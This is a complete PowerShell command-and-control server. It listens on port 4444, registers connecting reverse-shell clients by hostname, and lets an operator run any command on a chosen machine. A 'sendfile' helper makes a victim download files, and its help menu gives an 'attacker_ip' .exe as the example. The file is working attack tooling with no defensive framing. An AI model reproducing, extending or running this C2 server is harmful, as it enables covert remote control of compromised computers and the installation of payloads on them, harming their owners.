
$clients = [System.Collections.Concurrent.ConcurrentDictionary[string,object]]::new()
$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, 4444)
$listener.Start()
[System.Console]::WriteLine("Shell manager listening on port 4444...")

# Accept clients in background thread
Start-ThreadJob -ScriptBlock {
    param($listener, $clients)

    $encoding = [System.Text.Encoding]::UTF8

    while ($true) {
        try {
            $client = $listener.AcceptTcpClient()
            $stream = $client.GetStream()
            $buffer = New-Object byte[] 65536

            # Read banner until <END_OF_BANNER>
            $response = ""
            do {
                $read = $stream.Read($buffer, 0, $buffer.Length)
                $chunk = $encoding.GetString($buffer, 0, $read)
                $response += $chunk
            } while ($response -notmatch '<END_OF_BANNER>')

            $banner = $response -replace '<END_OF_BANNER>', '' -replace '\r|\n', "`n"
            $hostname = if ($banner -match 'Hostname:\s+([^\r\n]+)') {
                $matches[1].Trim()
            } else {
                "unknown"
            }

            $clientInfo = [pscustomobject]@{
                HostName = $hostname
                Banner   = $banner
                Client   = $client
                Stream   = $stream
            }

            $clients.TryAdd($hostname, $clientInfo) | Out-Null
            [System.Console]::WriteLine("`n[+] Client connected: $hostname")
            [System.Console]::WriteLine("$banner")
        }
        catch {
            [System.Console]::WriteLine("Error accepting client: $_")
        }
    }
} -ArgumentList $listener, $clients | Out-Null

[System.Console]::WriteLine("Waiting for first client to connect...")
while ($clients.Count -eq 0) {
    Start-Sleep -Milliseconds 500
}

# Helper: Send command to a specific client
function Send-CommandToClient {
    param($targetHost, $command)

    $encoding = [System.Text.Encoding]::UTF8
    $matchedKey = $clients.Keys | Where-Object { $_.ToLower() -eq $targetHost.ToLower() }
    if (-not $matchedKey) {
        [System.Console]::WriteLine("Invalid HostName ID")
        return
    }

    $stream = $clients[$matchedKey].Stream
    if (-not $stream) {
        [System.Console]::WriteLine("Stream is null—client may have disconnected")
        return
    }

    $bytes = $encoding.GetBytes($command + "<END_OF_COMMAND>")
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Flush()

    # Read response until <END_OF_OUTPUT>
    $buffer = New-Object byte[] 65536
    $response = ""
    do {
        $read = $stream.Read($buffer, 0, $buffer.Length)
        $chunk = $encoding.GetString($buffer, 0, $read)
        $response += $chunk
    } while ($response -notmatch '<END_OF_OUTPUT>')

    $response = $response -replace '<END_OF_OUTPUT>', '' -replace 'PS .+?>\s*$', ''
    [System.Console]::WriteLine("`n[$targetHost] Response:`n$response")
}

# Helper: Push file download command to client
function Send-FileToClient {
    param($targetHost, $url, $destination)

    $cmd = "Invoke-WebRequest -Uri `"$url`" -OutFile `"$destination`""
    Send-CommandToClient -targetHost $targetHost -command $cmd
}

function Show-HelpMenu {
    [System.Console]::WriteLine("")
    [system.console]::WriteLine("================= C2 HELP MENU =================")
    [System.Console]::WriteLine("Available Commands:")
    [System.Console]::WriteLine("")
    [System.Console]::WriteLine("help                               Show this help menu")
    [system.console]::WriteLine("refresh                            Refresh session list")
    [System.Console]::WriteLine("<any command>                      Executes the command on the client")
    [System.Console]::WriteLine("cls or clear                       Clear the screen")
    [System.Console]::WriteLine("sendfile <Host> <Url> <Dest>       Download a file to the client")
    [System.Console]::WriteLine("   Example - Paste it in, rather than type in manually")
    [System.Console]::WriteLine("       sendfile win10-client-01 http://attacker_ip/file.exe C:\Temp\file.exe")
}


# Dispatcher loop
while ($true) {

    [System.Console]::WriteLine("`nActive sessions:")
    foreach ($key in $clients.Keys) {
        [System.Console]::WriteLine("[$key] - $($clients[$key].HostName)")
    }

    $targethost = Read-Host "Enter HostName to interact with (or 'exit' or 'refresh' or 'help')"
    if ($targethost -eq 'exit') { break }
    if ($targethost -eq 'refresh') { continue }

    if ($targethost -eq 'help') {
        Show-HelpMenu
        continue
    }

    if ($targethost -match '^(cls|clear)$') {
        Clear-Host
        continue
    }

    if (-not $clients.ContainsKey($targethost)) {
        [System.Console]::WriteLine("Invalid HostName")
        continue
    }


    while ($true) {
        [System.Console]::WriteLine("Press Enter to refresh the prompt (e.g., if a new client connects). Type 'exit' to return to session list.")
        
        $command = Read-Host "[$targethost] Shell> ($($clients.Count) clients active)"

        if ($command -eq 'exit') { break }

        if ($command -eq 'help') {
            Show-HelpMenu
            continue
        }

        if ($command -match '^(cls|clear)$') {
		    Clear-Host
            continue
	    }
	
        if ($command -like "sendfile*") {
            $parts = $command -split "\s+"
            if ($parts.Count -eq 4) {
                Send-FileToClient -targetHost $parts[1] -url $parts[2] -destination $parts[3]
            } else {
                [System.Console]::WriteLine("Usage: sendfile <HostName> <URL> <DestinationPath>")
            }
        } elseif ($command -eq 'refresh') {
            break
        } else {
            Send-CommandToClient $targethost $command
        }
    }
}
